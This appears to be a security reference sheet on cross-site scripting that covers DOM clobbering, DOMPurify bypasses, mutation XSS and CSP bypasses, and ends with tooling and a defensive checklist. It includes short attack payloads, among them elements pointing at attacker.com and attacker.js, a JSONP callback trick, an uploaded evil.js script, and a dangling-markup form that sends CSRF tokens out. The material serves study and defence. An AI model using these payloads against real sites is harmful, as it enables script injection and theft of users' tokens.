# Cross-Site Scripting (XSS): 2026 Complete Reference

## DOM Clobbering (2026 Update)

DOM clobbering uses `id` and `name` attributes to shadow global variables without executing JS.

### Core Mechanism
- Elements with `id` become `window[id]` and `document[id]` properties (mandated by HTML spec)
- Elements with `name` become accessible via named property getters
- Two elements sharing an `id` form an `HTMLCollection` — indexed by `name` for nested property access like `x.y.z`
- `<a>` with `href` coerces to the resolved URL string — ideal leaf nodes for sink delivery
- `<iframe>` with `name` gives access to `contentWindow` and `srcdoc`/`src` attributes

### New Sink Classes (2022-2026)
1. **document.currentScript clobbering**: Inject `<img id="currentScript" src="attacker.js">` before loader script. `document.currentScript` resolves to the `<img>`, `src` attribute is attacker-controlled.
2. **Custom-element registry interactions**: `if (!window.MyComponent)` guard — inject `<a id="MyComponent">` to make check pass, `define()` is skipped, component never registered.
3. **Form-action clobbering**: `<form id="x"><input name="action" value="https://attacker.com">` makes `document.x.action` attacker-controlled URL. Form-handling code treats it as submission target.
4. **Base-URL hijack**: `<base href="https://attacker.com">` applied at parse time affects ALL relative URL resolution on the page.

### DOMPurify Bypass via Clobbering Internal Lookups
- DOMPurify looks up `node.attributes` to iterate attribute list. Clobbering `someElement.attributes` with an `<a>` element's HTMLCollection means the sanitizer iterates the wrong collection. Real dangerous attributes are missed.
- DOMPurify 3.4.9 closes this via realm-safe cached-getter clobbering probe (`_isClobbered` checks `nodeName`, `textContent`, `removeChild`, `attributes`, `removeAttribute`, `setAttribute`, `namespaceURI`, `insertBefore`, `hasChildNodes`, `nodeType`).
- Any node member outside this set (e.g., `getAttributeNames`) reintroduces the gap when called on distrusted nodes.
- jsdom does NOT implement `HTMLFormElement`'s `LegacyOverrideBuiltIns` — form-based clobbering of built-ins only reproduces in real browsers.

### New Defenses (2026)
- **Trusted Types** (Chromium): Sinks (`innerHTML`, `eval`, `script.src`) only accept values from named policies. Breaks clobbering-to-sink chains at the sink level. Requires application adoption.
- **Sanitizer API** (WICG draft): Browser-native sanitizer operating outside the document being sanitized. Eliminates the architectural problem of user-space sanitizers operating on a clobberable document namespace.
- **`SANITIZE_NAMED_PROPS: true`** in DOMPurify: Prefixes named props to break clobbering. Cheap to enable alongside `SANITIZE_DOM: true`.

## Mutation XSS (mXSS)

Markup sanitized into one DOM tree, but serializes and reparses into a different executable tree.

### Known Classes
- **Namespace confusion** (Michał Bentkowski): SVG/MathML namespace transitions cause parser to reinterpret markup
- **Comment-based bypass** (Gareth Heyes): Comments inside foreign content mutate across serialization
- **Nesting-based mXSS** (CVE-2024-47875, CVE-2024-45801): Deep nesting + SVG/MathML + table/caption/form repair → mutation chain after flattening
- DOMPurify removed element-nesting depth cap in 3.1.5, relies on namespace check + `SAFE_FOR_XML` attribute regex

## CSP Bypass Techniques
- **Nonce leak via DOM clobbering**: Clobber `document.currentScript` to leak nonce to attacker-controlled element
- **JSONP endpoints**: Find `<script>` with dynamic `src` that includes JSONP callback — use `?callback=alert(1)`
- **File upload to same origin**: Upload `.js` file, reference via `<script src="/uploads/evil.js">`
- **CDN path traversal**: `/assets/..%2f..%2f..%2f..%2fnode_modules/jquery/dist/jquery.js`
- **Dangling markup**: `<form action="https://attacker.com"><input type="submit" value="next">` — exfiltrates CSRF tokens via form submission

## Detection & Tooling
- **DOM Invader** (Burp): Automatic prototype pollution and DOM XSS detection
- **inspectJS**: 35+ secret patterns, source maps, tech stack, DOM XSS
- **CSP Evaluator**: Validate CSP is actually in force
- **DOMPurify attack corpus**: DOMPurify Wiki tracks all attack classes and regression tests

## Defensive Checklist
1. Enable `SANITIZE_DOM: true` + `SANITIZE_NAMED_PROPS: true` in DOMPurify
2. Adopt Trusted Types for high-risk sinks
3. Use `const`/`let` in module scope instead of `window.X || default` patterns
4. Type-check before using DOM-accessed values (`instanceof HTMLElement` as negative check)
5. Strip or namespace `id`/`name` in sanitization when not needed
6. Strict CSP with nonces/hashes, no `'unsafe-inline'`
7. Render untrusted HTML in sandboxed iframe on separate origin
8. Test clobbering in real browsers (NOT jsdom)